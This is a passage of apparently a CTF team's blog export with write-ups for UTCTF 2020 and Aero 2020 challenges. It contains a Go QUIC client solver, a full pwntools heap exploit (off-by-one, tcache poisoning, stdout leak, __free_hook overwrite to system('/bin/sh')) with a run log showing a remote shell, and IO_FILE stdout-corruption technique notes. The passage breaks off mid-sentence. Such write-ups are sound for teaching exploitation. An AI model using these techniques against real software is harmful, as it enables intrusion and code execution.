waits until the counter reaches the number zero. This happens when echoServer() finishes which will decrease the counter to zero. Making the server listening at 0.0.0.0:6969 and set up TLS configurations: 12345678910111213141516171819202122232425262728293031323334353637383940414243func echoServer() error &#123; listener, err := quic.ListenAddr(addrClientS, generateTLSConfig(), nil) if err != nil &#123; return err &#125; sess, err := listener.Accept(context.Background()) if err != nil &#123; return err &#125; stream, err := sess.AcceptStream(context.Background()) if err != nil &#123; panic(err) &#125; err = readBytes(stream, 26) if err != nil &#123; return err &#125; ...&#125;// Setup a bare-bones TLS config for the serverfunc generateTLSConfig() *tls.Config &#123; key, err := rsa.GenerateKey(rand.Reader, 1024) if err != nil &#123; panic(err) &#125; template := x509.Certificate&#123;SerialNumber: big.NewInt(1)&#125; certDER, err := x509.CreateCertificate(rand.Reader, &amp;template, &amp;template, &amp;key.PublicKey, key) if err != nil &#123; panic(err) &#125; keyPEM := pem.EncodeToMemory(&amp;pem.Block&#123;Type: \"RSA PRIVATE KEY\", Bytes: x509.MarshalPKCS1PrivateKey(key)&#125;) certPEM := pem.EncodeToMemory(&amp;pem.Block&#123;Type: \"CERTIFICATE\", Bytes: certDER&#125;) tlsCert, err := tls.X509KeyPair(certPEM, keyPEM) if err != nil &#123; panic(err) &#125; return &amp;tls.Config&#123; Certificates: []tls.Certificate&#123;tlsCert&#125;, NextProtos: []string&#123;\"quic-echo-example\"&#125;, &#125;&#125; Reading the next problem: 1234err = readBytes(stream, 26)if err != nil &#123; return err&#125; The next problem is to calculate expressions: 123Hey... you up?Math time!123458 + 341231 Once again using regex to extract everything: 12345678910111213141516171819202122232425262728func echoServer() error &#123; ... for i:=0; i&lt; 1000; i++ &#123; num := make([]byte, 0x30) _, err = stream.Read(num); if err != nil &#123; return err &#125; re := regexp.MustCompile(\"[0-9]+\") re2 := regexp.MustCompile(\"[-+*/^&amp;]\") num1,_ := strconv.Atoi(re.FindAllString(string(num),-1)[0]) num2,_ := strconv.Atoi(re.FindAllString(string(num),-1)[1]) exp := re2.FindString(string(num)) //fmt.Printf(\"%s\\n\", num) //fmt.Printf(\"%d\\n\", num1) //fmt.Printf(\"%s\\n\", exp) //fmt.Printf(\"%d\\n\", num2) res := calculateExp(num1, num2, exp) //fmt.Printf(\"%d\\n\", res) _,err = io.WriteString(stream,strconv.Itoa(res)) if err != nil &#123; return err &#125; &#125; b, err := ioutil.ReadAll(stream) fmt.Printf(\"%s\\n\", b)&#125; After calculating 1000 expressions we get the flag: 12Great Job!utflag&#123;Qu1C_p@cK3t$_a73jc8s&#125; The full script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213package mainimport ( \"context\" //\"encoding/binary\" \"crypto/rand\" \"crypto/rsa\" \"crypto/tls\" \"regexp\" \"strconv\" \"sync\" //\"time\" //\"strings\" \"crypto/x509\" \"encoding/pem\" \"fmt\" \"io\" \"io/ioutil\" \"log\" \"math/big\" quic \"github.com/lucas-clemente/quic-go\")const addr = \"192.168.1.3:1337\"//\"54.152.23.18:1337\"const addrClientS = \"0.0.0.0:6969\"const message = \"Hello\"// We start a server echoing data on the first stream the client opens,// then connect with a client, send the message, and wait for its receipt.func main() &#123; var wg sync.WaitGroup wg.Add(1) go func() &#123; log.Fatal(echoServer()) &#125;() err := clientMain() if err != nil &#123; panic(err) &#125; wg.Wait()&#125;func calculateExp(num1 int,num2 int,exp string) int &#123; switch exp &#123; case \"+\": return num1 + num2 case \"-\": return num1 - num2 case \"/\": return num1 / num2 case \"*\": return num1 * num2 case \"^\": return num1 ^ num2 case \"&amp;\": return num1 &amp; num2 &#125; return 0&#125;// Start a server that echos all data on the first stream opened by the clientfunc echoServer() error &#123; listener, err := quic.ListenAddr(addrClientS, generateTLSConfig(), nil) if err != nil &#123; return err &#125; sess, err := listener.Accept(context.Background()) if err != nil &#123; return err &#125; stream, err := sess.AcceptStream(context.Background()) if err != nil &#123; panic(err) &#125; err = readBytes(stream, 26) if err != nil &#123; return err &#125; for i:=0; i&lt; 1000; i++ &#123; num := make([]byte, 0x30) _, err = stream.Read(num); if err != nil &#123; return err &#125; re := regexp.MustCompile(\"[0-9]+\") re2 := regexp.MustCompile(\"[-+*/^&amp;]\") num1,_ := strconv.Atoi(re.FindAllString(string(num),-1)[0]) num2,_ := strconv.Atoi(re.FindAllString(string(num),-1)[1]) exp := re2.FindString(string(num)) //fmt.Printf(\"%s\\n\", num) //fmt.Printf(\"%d\\n\", num1) //fmt.Printf(\"%s\\n\", exp) //fmt.Printf(\"%d\\n\", num2) res := calculateExp(num1, num2, exp) //fmt.Printf(\"%d\\n\", res) _,err = io.WriteString(stream,strconv.Itoa(res)) if err != nil &#123; return err &#125; &#125; b, err := ioutil.ReadAll(stream) fmt.Printf(\"%s\\n\", b) return err&#125;func readBytes(stream io.Reader, n int) error &#123; for i:=0; i&lt; n; i++ &#123; buf := make([]byte, 1) _, err := io.ReadFull(stream, buf); if err != nil &#123; return err &#125; fmt.Printf(\"%s\", buf); &#125; return nil&#125;func toHex(x []byte, n int) string &#123; re := regexp.MustCompile(\"[0-9]+\") h,err := strconv.Atoi(re.FindString(string(x))) if err != nil &#123; panic(err) &#125; return fmt.Sprintf(\"%x\", h)&#125;func clientMain() error &#123; tlsConf := &amp;tls.Config&#123; InsecureSkipVerify: true, NextProtos: []string&#123;\"quic-echo-example\"&#125;, &#125; session, err := quic.DialAddr(addr, tlsConf, nil) if err != nil &#123; return err &#125; stream, err := session.OpenStreamSync(context.Background()) if err != nil &#123; return err &#125; fmt.Printf(\"Client: Sending '%s'\\n\", message) _, err = io.WriteString(stream,message)//stream.Write([]byte(message)) if err != nil &#123; return err &#125; err = readBytes(stream, 248) if err != nil &#123; return err &#125; //fmt.Printf(\"Now number:\\n\") for i:=0; i&lt; 1000; i++ &#123; num := make([]byte, 7) n, err := stream.Read(num); if err != nil &#123; return err &#125; s := \"0x\"+toHex(num,n) //fmt.Printf(\"%d\\n\", i) //fmt.Printf(\"Received %s\", num); //fmt.Printf(\"Sending %s\\n\",s) //_,err = io.WriteString(stream,s) _, err = stream.Write([]byte(s)) if err != nil &#123; return err &#125; &#125; b, err := ioutil.ReadAll(stream) fmt.Printf(\"%s\\n\", b) return nil&#125;// A wrapper for io.Writer that also logs the message.type loggingWriter struct&#123; io.Writer &#125;func (w loggingWriter) Write(b []byte) (int, error) &#123; fmt.Printf(\"Server: Got '%s'\\n\", string(b)) return w.Writer.Write(b)&#125;// Setup a bare-bones TLS config for the serverfunc generateTLSConfig() *tls.Config &#123; key, err := rsa.GenerateKey(rand.Reader, 1024) if err != nil &#123; panic(err) &#125; template := x509.Certificate&#123;SerialNumber: big.NewInt(1)&#125; certDER, err := x509.CreateCertificate(rand.Reader, &amp;template, &amp;template, &amp;key.PublicKey, key) if err != nil &#123; panic(err) &#125; keyPEM := pem.EncodeToMemory(&amp;pem.Block&#123;Type: \"RSA PRIVATE KEY\", Bytes: x509.MarshalPKCS1PrivateKey(key)&#125;) certPEM := pem.EncodeToMemory(&amp;pem.Block&#123;Type: \"CERTIFICATE\", Bytes: certDER&#125;) tlsCert, err := tls.X509KeyPair(certPEM, keyPEM) if err != nil &#123; panic(err) &#125; return &amp;tls.Config&#123; Certificates: []tls.Certificate&#123;tlsCert&#125;, NextProtos: []string&#123;\"quic-echo-example\"&#125;, &#125;&#125;","categories":[{"name":"Network","slug":"Network","permalink":"https://teamrocketist.github.io/categories/Network/"}],"tags":[{"name":"network","slug":"network","permalink":"https://teamrocketist.github.io/tags/network/"},{"name":"utctf2020","slug":"utctf2020","permalink":"https://teamrocketist.github.io/tags/utctf2020/"},{"name":"quic","slug":"quic","permalink":"https://teamrocketist.github.io/tags/quic/"},{"name":"golang","slug":"golang","permalink":"https://teamrocketist.github.io/tags/golang/"}]},{"title":"[Pwn] UTCTF 2020 - Cancelled","slug":"Pwn-UTCTF-2020-Cancelled","date":"2020-03-10T04:22:27.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2020/03/10/Pwn-UTCTF-2020-Cancelled/","link":"","permalink":"https://teamrocketist.github.io/2020/03/10/Pwn-UTCTF-2020-Cancelled/","excerpt":"","text":"Cancelled Description:1879pts Solvers 26 We should cancel all pwners. by jitterbug pwnable2377bb9cec90614f4ba5c4c213a48709libc-2.27.so50390b2ae8aaa73c47745040f54e602f nc binary.utctf.live 9050 Solution Allocate 4 chunks A[0x18], B[0x18], C[0x70], D[0x21]. Free chunk A[0x18]. Allocate a new chunk A[0x18] and use off by one overflow to change size of B to 0x91. Free chunk B, this won’t return any errors because we created some fake chunks in C and D. B[0x90] is on unsortedbin now. Free chunk C. Next allocations will reuse space from chunk B if they fit. Allocate a new chunk of size 0x10 to put a libc address at the FD of chunk C. Malloc(0x20) and do a 4 bit brute force at the libc address present in FD to get stdout. Stdout is now present in the tcache[0x80] linked list. Second malloc of that size will write into the stdout struct. Modify _IO_2_1_stdout to make puts leak a libc address (Angelboy leak). Reuse the same technique to modify some tcache linked list pointer into free_hook. Write system into free_hook. Free a chunk that has /bin/sh\\x00 as content to get a shell. Architecture and protectionsThe binary is 64-bit and libc is dynamically linked. 12$ file pwnablepwnable: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4185d6d607a16d28f64337f42a47822bed521751, not stripped Besides fortify everything is enabled: 1234567$ checksec pwnable[*] '/ctf/work/pwn/cancelled/pwnable' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled BinaryThe binary has two options, in the “add person” option we can specify the index to store the persons name and a description, for the description we can also control its size.The cancel person option we can remove it from the list by specifying the respective index. VulnerabilityWe have a controllable off by one at the add option: Angelboy leakNot sure if this technique was first used by angelboy but the first time I saw it being used was at Hitcon 2018, in a challenge created by himself which he later published his solution at github. This technique resolves on corrupting the stdout IO_FILE struct to make puts leak a libc address, I’m not explaining in detail the internals of printf you can find some explanations in my older write up plane market or at babytcache writeup. To write into the stdout IO_FILE struct we kinda need to do a 4 bit brute-force in an unsorted bin libc address, but to achieve this we need to first use the off by one overflow vulnerability. The main idea here is to use off by one to increase the size of a chunk in the unsorted bin to get some chunk overlaps via shrinking of the freed chunk and also overlapping new allocated chunks. We can start by creating 4 chunks (A,B,C,D). 1234add(0x0, 'A'*8, 0x18, 'A'*0x8)add(0x1, 'B'*8, 0x18, 'B'*0x8) # Overwrite this chunk size is the objectiveadd(0x2, 'C'*8, 0x70, b'C'*96+p64(0)+p64(0x21)) # Prevent Double-free or corruptionadd(0x3, 'D'*8, 0x21, p64(0)+p64(0x1)) # corrupted vs. prev_size The next thing to do is to change chunk B size into 0x91, but the libc version is 2.27 which uses tcache, so any chunk bellow 0x410 will go into their respective tcache bin. To prevent this we can fill tcache[0x90] with 7 frees which is the limit of a tcache bin: 1234for x in range(7): add(0x4+x, 'E'*8, 0x80, 'E'*8) # Create 0x90 chunks to later fill tcache[0x90]for x in range(7): free(0x4+x) # Fill tcache[0x90] Now that tcache[0x90] is full we have to overflow chunks B size, there isn’t an edit function so we need to free chunk A first and allocate a new one there. The chunk A is now placed at tcache[0x20] if the new allocation is in same range that memory space is reused, and the new chunk will be placed at the same place as the old A. Now that we can control chunks A description we can finally modify chunks B size to 0x91. 123free(0) # Insert chunk A into tcache[0x20]add(0x0, 'A'*8, 0x18, 'A'*0x18+'\\x91') # Overflow B size to 0x91free(1) # Goes to the unsorted bin because tcache[0x20] is full The chunks created inside C and D are to prevent two security checks “prevent double-free or corruption” and “corrupted vs. prev_size” when freeing chunk B, you can check my write up penpal_world to understand more about this security checks. Now we want to use tcache[0x90] again, we filled it before by freeing 7 times , to use it again we need to malloc the same numbers: 12for x in range(7): add(0xa+x, 'A'*8, 0x80, 'A'*0x10) # clean tcache[0x90] tcache[0x90] is now reusable again, we can now send chunk C into tcache[0x90] , chunk C is located right after chunk B which size just got increased, because of this it can be used to overlap the fd pointer of chunk C by shrinking chunk B using malloc: 1add(0x11, 'A'*8, 0x10, 'A'*0x2) # put a libc address at next pointer from tcache[0x80] The view of the chunks before the shrink:The view after the shrink:It’s time to update the FD of C into stdout, we can do this by allocating a 0x20 chunk to shrink B again and overlap C: 1add(0x12,'B'*8,0x20, '\\x60\\xa7') # STDOUT, trying a 4bit bruteforce Failed attempt to get stdout:To check if we succeeded to get it we can preform this checks: 123456789101112131415add(0x13,'B'*8,0x70, 'A') # head of tcache[0x80]free(0x13) # to make tcache[0x80] counter positiveadd(0x14,'B'*8,0x70, p64(0x0fbad1800)+ 3*p64(0) + b'\\x00') # overwrite stdout to get a leakif r.recv(4) == b'Menu': # first check to see if the leak happened log.failure(\"not lucky enough!\") r.close() return FalseLEAK = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))LIBC = LEAK-0x3ed8b0if LIBC &gt;&gt; 40 != 0x7f or LIBC &amp; 0xFFF != 0: # 2nd check to make sure log.failure(\"not lucky enough!\") r.close() return False Update free_hook to systemTo update free_hook we can do a similar strategy we used before to edit stdout, we can start by freeing a chunk after the old chunk B located in the unsorted bin and then allocate it again to create a fake chunk inside of it(to prevent a security check error): 12free(0xa+6, True) # free chunk after old chunk Badd(0xa+6, 'K'*8, 0x80, p64(0)*2+p64(0xa0)+p64(0x70), True) # create a fake chunk inside so we can increase the size of chunk B Next we allocate the chunk before chunk B and tamper the size to 0xa1: 12add(0x0,'B'*8,0x28, 'A'*0x28+'\\xa1', True) # change size of chunk B to 0xa1free(0xa+6,True) # free chunk after chunk B again Now that chunk B overlaps the next, we can allocate a chunk that covers the entire freed chunk and edit the FD of the next chunk to free_hook: 1add(0x0, 'L'*8, 0x90, b'L'*0x70+p64(0)+p64(0x91)+p64(FREE_HOOK), True) # Overlapping chunk Now is a matter of doing two mallocs and change the hook to system and freeing a chunk with “/bin/sh\\x00” in its data: 123add(0x7, b'/bin/sh\\x00', 0x80, b'/bin/sh\\x00', True) # prepare the first argument of systemadd(0x13, b'/bin/sh\\x00', 0x80, p64(SYSTEM), True) # update free_hook contents to systemfree(0x7, True) # trigger shell The full exploit: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116from pwn import *host, port = \"binary.utctf.live\", \"9050\"filename = \"./pwnable\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libcelse: libc = ELF('./libc-2.27.so')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"r\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)def add(index, name, length, description, stdoutFuckedUp=False): if stdoutFuckedUp: r.sendlineafter('Cancel Person\\n', '1') else: r.sendlineafter('\\n&gt;','1') r.sendlineafter('Index: ', str(index)) r.sendlineafter('Name:', name) r.sendlineafter('Length of description: ', str(length)) r.sendafter('Description: ', description) #passdef free(index, stdoutFuckedUp=False): if stdoutFuckedUp: r.sendlineafter('Cancel Person\\n', '2') else: r.sendlineafter('\\n&gt;','2') r.sendlineafter('Index: ', str(index))context.terminal = ['tmux', 'new-window']def exploit():# global r try: r = getConn() add(0x0, 'A'*8, 0x18, 'A'*0x8) add(0x1, 'B'*8, 0x18, 'B'*0x8) add(0x2, 'C'*8, 0x70, b'C'*96+p64(0)+p64(0x21)) add(0x3, 'D'*8, 0x21, p64(0)+p64(0x1)) for x in range(7): add(0x4+x, 'E'*8, 0x80, 'E'*8) # Create 0x90 chunks to later fill tcache[0x90] for x in range(7): free(0x4+x) # Fill tcache[0x90] if not args.REMOTE and args.GDB: debug([0xCC8,0xBC7]) free(0) # Insert chunk A into tcache[0x20] add(0x0, 'A'*8, 0x18, 'A'*0x18+'\\x91') # Overflow B size to 0x91 free(1) # Goes to the unsorted bin because tcache[0x20] is full for x in range(7): add(0xa+x, 'A'*8, 0x80, 'A'*0x10) # clean tcache[0x90] free(0x2) # send this to tcache[0x80] add(0x11, 'A'*8, 0x10, 'A'*0x2) # put a libc address at next pointer from tcache[0x80] #if args.REMOTE: add(0x12,'B'*8,0x20, '\\x60\\xa7') # STDOUT, trying a 4bit bruteforce #else: # add(0x12, 'B'*8, 0x20, '\\x60\\x07\\xdd') # echo 0 | sudo tee /proc/sys/kernel/randomize_va_space #r.interactive() add(0x13,'B'*8,0x70, 'A') # head of tcache[0x80] free(0x13) # to make tcache[0x80] counter positive add(0x14,'B'*8,0x70, p64(0x0fbad1800)+ 3*p64(0) + b'\\x00') # overwrite stdout to get a leak if r.recv(4) == b'Menu': # first check to see if the leak happened log.failure(\"not lucky enough!\") r.close() return False LEAK = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) LIBC = LEAK-0x3ed8b0 if LIBC &gt;&gt; 40 != 0x7f or LIBC &amp; 0xFFF != 0: # 2nd check to make sure log.failure(\"not lucky enough!\") r.close() return False FREE_HOOK = LIBC + libc.symbols['__free_hook'] SYSTEM = LIBC + libc.symbols['system'] log.info('LEAK 0x%x' % LEAK) log.info('LIBC 0x%x' % LIBC) free(0xa+6, True) # free chunk after old chunk B add(0xa+6, 'K'*8, 0x80, p64(0)*2+p64(0xa0)+p64(0x70), True) # create a fake chunk inside so we can increase the size of chunk B add(0x0,'B'*8,0x28, 'A'*0x28+'\\xa1', True) # change size of chunk B to 0xa1 free(0xa+6,True) # free chunk after chunk B again add(0x0, 'L'*8, 0x90, b'L'*0x70+p64(0)+p64(0x91)+p64(FREE_HOOK), True) # Overlapping chunk add(0x7, b'/bin/sh\\x00', 0x80, b'/bin/sh\\x00', True) # prepare the first argument of system add(0x13, b'/bin/sh\\x00', 0x80, p64(SYSTEM), True) # update free_hook contents to system free(0x7, True) # trigger shell r.interactive() r.close() return True except EOFError: r.close() return Falsewhile not exploit(): pass Running it: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253$ python3 cancelled.py REMOTE[*] '/ctf/work/pwn/cancelled/pwnable' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/ctf/work/pwn/cancelled/libc-2.27.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[-] not lucky enough![*] Closed connection to binary.utctf.live port 9050[+] Opening connection to binary.utctf.live on port 9050: Done[*] LEAK 0x7f2ddf97b8b0[*] LIBC 0x7f2ddf58e000[*] Switching to interactive mode/bin/sh is cancelled.$ ll$ lsflag.txt$ cat flag.txtutflag&#123;j1tt3rbUg_iS_Canc3l1ed_:(&#125; References https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping/ https://github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py https://vigneshsrao.github.io/babytcache/ https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/ https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"IO_FILE","slug":"Pwn/x64/Glibc-Malloc/IO-FILE","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"},{"name":"Off By One","slug":"Pwn/x64/Glibc-Malloc/Off-By-One","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"},{"name":"Tcache","slug":"Pwn/x64/Glibc-Malloc/Tcache","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"},{"name":"tcache_poisoning","slug":"Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/"}],"tags":[{"name":"file_stream","slug":"file-stream","permalink":"https://teamrocketist.github.io/tags/file-stream/"},{"name":"io_file","slug":"io-file","permalink":"https://teamrocketist.github.io/tags/io-file/"},{"name":"io_file_struct","slug":"io-file-struct","permalink":"https://teamrocketist.github.io/tags/io-file-struct/"},{"name":"heap","slug":"heap","permalink":"https://teamrocketist.github.io/tags/heap/"},{"name":"off_by_one","slug":"off-by-one","permalink":"https://teamrocketist.github.io/tags/off-by-one/"},{"name":"tcache","slug":"tcache","permalink":"https://teamrocketist.github.io/tags/tcache/"}]},{"title":"[Pwn] Aero 2020 - Plane Market","slug":"Pwn-Aero-2020-Plane-Market","date":"2020-03-01T15:57:25.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2020/03/01/Pwn-Aero-2020-Plane-Market/","link":"","permalink":"https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/","excerpt":"","text":"Plane Market Description:416pts Solvers ??? … plane_market c8052c64cf194d22ca42f0ef4fa6ffc8libc.so.6 5f4f99671c3a200f7789dbb5307b04bbld-linux-x86-64.so.2 63d339810fe3d20a86e3ff2237e46d89 nc ctf.pragyan.org 17000 TLDR Use a negative index to change _IO_2_1_STDOUT_ and execute IO_OVERFLOW. Next puts will leak a libc address. Repeat 1st step but now change flags field to “/bin/sh\\x00” and the vtable to IO_helper_jumps. Change IO_helper_jumps IO_OVERFLOW pointer to system. Next puts/printf will execute IO_OVEFLOW (fp, EOF) which is now system(fp=/bin/sh). ChallengeI feel like I ended up using an unintended solution, this binary had a lot more options but I ended up only using the change_plane_name function. In the end my solution is based in exploiting the IO_FILE_STRUCTURE, by abusing a negative index that allow us to modify STDOUT. Preparing the binary to LD_PRELOADTo preload this binary we need to use patchelf to use the ld given by the challenge:12$ cp plane_market plane_marketbkup$ patchelf --set-interpreter ld-linux-x86-64.so.2 ./plane_marketbkup Now preloading in the terminal:1234567891011LD_PRELOAD=./libc.so.6 ./plane_marketbkup&#123;?&#125; Enter name: lol-------- Plane market --------1. Sell plane2. Delete plane3. View sales list4. View plane5. Change plane name6. View profile7. Exit&gt; 7 Preloading with pwntools:1r=process(filename, env=&#123;\"LD_PRELOAD\":\"./libc.so.6\"&#125;) if not args.REMOTE else remote(host, port) Binary analysis12345678910$ file plane_marketplane_market: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3a51921137c51149f99313e174755aeb4d8670fc, for GNU/Linux 3.2.0, not stripped$ checksec plane_market[*] '/ctf/aero2020ctf/pwn/PlaneMarket/plane_market' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Static analysis123456789101112131415161718192021222324252627282930313233__int64 change_plane_name()&#123; __int64 result; // rax int v1; // [rsp+Ch] [rbp-4h] printf(\"&#123;?&#125; Enter plane id: \"); v1 = read_int(); if ( v1 &lt;= 15 ) &#123; if ( v1 == last_plane_id ) &#123; printf(\"&#123;?&#125; Enter new plane name: \"); result = read_buf(*((void **)&amp;plane_list + 6 * v1), *((_QWORD *)&amp;unk_404100 + 6 * v1)); &#125; else &#123; result = qword_404108[6 * v1]; if ( !result ) &#123; printf(\"&#123;?&#125; Enter new plane name: \"); read_buf(*((void **)&amp;plane_list + 6 * v1), *((_QWORD *)&amp;unk_404100 + 6 * v1)); result = (unsigned int)v1; last_plane_id = v1; &#125; &#125; &#125; else &#123; puts(\"&#123;-&#125; Error id!\"); result = 0LL; &#125; return result;&#125; The vulnerability is here, there isn’t a check for negative indexes. ExploitBy editing the -2 index things will be aligned with the stdout and stderr pointers in the BSS. In the end the size filed of “read“ will be part of the stderr pointer and the pointer of stdout will be the buf to be edited: The first edit is to make printf/puts to leak a libc address the way we can do this is by changing the STDOUT file structure to meet this conditions: 12345IO_2_1_stdout-&gt;file-&gt;_flags = 0xfbad1800 IO_2_1_stdout-&gt;file-&gt;_IO_read_ptr = 0x0 IO_2_1_stdout-&gt;file-&gt;_IO_read_end = 0x0IO_2_1_stdout-&gt;file-&gt;_IO_read_base = 0x0IO_2_1_stdout-&gt;file-&gt;_IO_write_base; //modify last byte with 0xa or 0x0 To get the libc source code of this version we can get the source from glibc git and change to the correct branch: 12345678910111213141516171819202122$ strings libc.so.6 | grep 'glibc'glibc 2.29Fatal error: glibc detected an invalid stdio handleFatal glibc error: array index %zu not less than array length %zuFatal glibc error: invalid allocation buffer of size %zu$ git clone git://sourceware.org/git/glibc.gitCloning into 'glibc'...remote: Enumerating objects: 580861, done.remote: Counting objects: 100% (580861/580861), done.remote: Compressing objects: 100% (77106/77106), done.remote: Total 580861 (delta 492799), reused 580285 (delta 492341)Receiving objects: 100% (580861/580861), 175.11 MiB | 1.63 MiB/s, done.Resolving deltas: 100% (492799/492799), done.Updating files: 100% (17361/17361), done.$ cd glibc$ git checkout release/2.29/masterUpdating files: 100% (12744/12744), done.Branch 'release/2.29/master' set up to track remote branch 'release/2.29/master' from 'origin'.Switched to a new branch 'release/2.29/master' And why ? “puts” internally calls _IO_new_file_xsputn which eventually calls IO_OVERFLOW.Examining IO_OVERFLOW which its function is denoted by _IO_new_file_overflow and located at glibc/libio/fileops.c: 1234567891011121314151617int_IO_new_file_overflow (FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; ... truncated ... &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, // We want this f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); Eventually _IO_do_write will be called in this function. stdout-&gt;_flags &amp; _IO_NO_WRITES is set to zero to avoid running some unnecessary code, we do the same for stdout-&gt;_flags &amp; _IO_CURRENTLY_PUTTING. _IO_new_file_overflow calls _IO_do_write with arguments as stdout, stdout-&gt;_IO_write_base and size of the buffer which is calculated via f-&gt;_IO_write_ptr - f-&gt;_IO_write_base. From changelogs we know that _IO_do_write is defined as a macro for _IO_new_do_write:1versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1); _IO_new_do_write will call new_do_write with the same parameters (glibc/libio/fileops.c): 12345678910111213141516171819202122232425262728293031int_IO_new_do_write (FILE *fp, const char *data, size_t to_do)&#123; return (to_do == 0 || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;libc_hidden_ver (_IO_new_do_write, _IO_do_write)static size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123; size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; count = _IO_SYSWRITE (fp, data, to_do); // our aim ... truncated ... return count;&#125; The intention is to skip the else if block, to achieve this we need to make this true fp-&gt;_flags &amp; _IO_IS_APPENDING, so we can set the right flags like this 1234_flags = 0xfbad0000 // Magic number_flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800 All that we have to do is to set stdout-&gt;_flags to the value we calculated and partial overwrite stdout-&gt;_IO_write_base to make it point somewhere to get a leak. Having libc we just need to find a way to get a shell, we can use IO_FILE structure again, but this time instead of entering IO_OVERFLOW we want to actually change its pointer and how we can do this? Each IO_FILE has a vtable that contains multiple saved pointers to functions like IO_OVERFLOW:Let’s see the contents of IO_file_jumps vtable:But IO_file_jumps is to far from the stdout, to actually change that pointer, it would require us to change 